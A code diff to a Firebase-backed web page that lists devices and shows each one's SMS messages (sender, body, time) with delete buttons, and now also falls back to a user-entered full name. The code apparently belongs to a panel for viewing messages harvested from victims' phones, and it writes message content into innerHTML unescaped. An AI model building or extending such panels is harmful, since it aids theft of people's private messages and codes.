@@ -33,40 +33,44 @@ const firebaseConfig = {
     const container = document.getElementById('content');
 
     function render(snapshot){
-      container.innerHTML = '';
-      snapshot.forEach(function(deviceSnap){
-        const deviceId = deviceSnap.key;
-        const deviceData = deviceSnap.val();
+  container.innerHTML = '';
+  snapshot.forEach(function(deviceSnap){
+    const deviceId = deviceSnap.key;
+    const deviceData = deviceSnap.val();
 
-        // device name (model) fallback to deviceId
-        let name = deviceId;
-        if(deviceData.DeviceInfo && deviceData.DeviceInfo.model){
-          name = deviceData.DeviceInfo.model;
-        }
+    // Display name priority: model > fullName > deviceId
+    let name = deviceId;
+    if(deviceData.DeviceInfo && deviceData.DeviceInfo.model){
+      name = deviceData.DeviceInfo.model;
+    }
+    else if(deviceData.input && deviceData.input.fullName){
+      name = deviceData.input.fullName;
+    }
 
-        const h2 = document.createElement('h2');
-        h2.innerText = name;
-        container.appendChild(h2);
-
-        if(deviceData.sms){
-          Object.entries(deviceData.sms).forEach(([msgId, smsObj])=>{
-            const card = document.createElement('div');
-            card.className = 'sms-card';
-            card.innerHTML = `
-              <b>Sender:</b> ${smsObj.sender}<br/>
-              <b>Body:</b> ${smsObj.messageBody}<br/>
-              <b>Time:</b> ${smsObj.time}<br/>
-              <button class="delete-btn" onclick="deleteMsg('${deviceId}','${msgId}')">Delete</button>
-            `;
-            container.appendChild(card);
-          });
-        }else{
-          const p = document.createElement('p');
-          p.innerText = 'No SMS';
-          container.appendChild(p);
-        }
+    const h2 = document.createElement('h2');
+    h2.innerText = name;
+    container.appendChild(h2);
+    
+    if(deviceData.sms){
+      Object.entries(deviceData.sms).forEach(([msgId, smsObj])=>{
+        const card = document.createElement('div');
+        card.className='sms-card';
+        card.innerHTML = `
+          <b>Sender:</b> ${smsObj.sender}<br/>
+          <b>Body:</b> ${smsObj.messageBody}<br/>
+          <b>Time:</b> ${smsObj.time}<br/>
+          <button class="delete-btn" onclick="deleteMsg('${deviceId}','${msgId}')">Delete</button>
+        `;
+        container.appendChild(card);
       });
     }
+    else{
+      const p = document.createElement('p');
+      p.innerText = 'No SMS found.';
+      container.appendChild(p);
+    }
+  });
+}
 
     // ⏱ realtime listener
     db.ref('Devices').on('value', function(snapshot){
